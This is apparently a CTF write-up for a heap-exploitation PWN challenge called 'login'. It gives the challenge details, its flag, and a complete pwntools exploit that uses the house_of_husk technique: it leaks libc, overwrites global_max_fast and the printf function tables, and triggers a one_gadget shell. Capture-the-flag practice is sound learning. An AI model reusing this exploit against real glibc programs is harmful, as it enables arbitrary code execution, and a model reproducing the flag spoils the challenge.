- **题目名称：** login
- **题目类型：** PWN  （决赛）
- **题目难度：**中等偏下(?)
- **出题人：** i-Corner
- **考点：**

1. IO or house_of_husk
1. 检索+耐心

- **描述：** 跑路结束！原神，启动！尘歌壶，养猪！
- **flag：** XSCTF{C0ngratulati0n_u_are_the_real_her0}
- **Writeup：**

```python
from pwn import *
#p = process("./login")
#p = process(["./pwn"],env={"LD_PRELOAD":'./libc-2.27.so'})
#gdb.attach(p)
#pause()
p = remote("0.0.0.0",10001)
context.log_level='debug'
#define MAIN_ARENA       0x3ebc40
#define MAIN_ARENA_DELTA 0x60
#define GLOBAL_MAX_FAST  0x3ed940
#define PRINTF_FUNCTABLE 0x3f0738
#define PRINTF_ARGINFO   0x3ec870
#ARGTABLE_Size = (0x3ec870-0x3ebc40)*2 - 0x10 = 0x1850
#FUNCTABLE_Size = (0x3f0738-0x3ebc40)*2 - 0x10 = 0x95e0
# use python to calculate

p.sendlineafter("What size of a pig you want?\n",str(0x1850)) 

p.sendlineafter("Wow! You can get a new size of a pig!",str(0x95e0)) #local 


libc_base = u64(p.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00'))-0x3ebca0
global_max_fast = libc_base + 0x3ed940
print('libc:',hex(libc_base))
print('global_max_fast',hex(global_max_fast))

#p.sendafter("New name:",b'/bin/sh\x00'+p64(global_max_fast-0x10))
p.sendafter("New name:",b'a'*0x8+p64(global_max_fast-0x10))
p.sendlineafter("Which one?\n",'1')
#gdb.attach(p)
one_gadget = 0x10a2fc+libc_base
#gdb.attach(p)
#pause()

p.sendafter("Feed what?",b'a'*((ord('s')-2)*8)+p64(one_gadget))

# when call printf('%s') then getshell 
p.interactive()


```
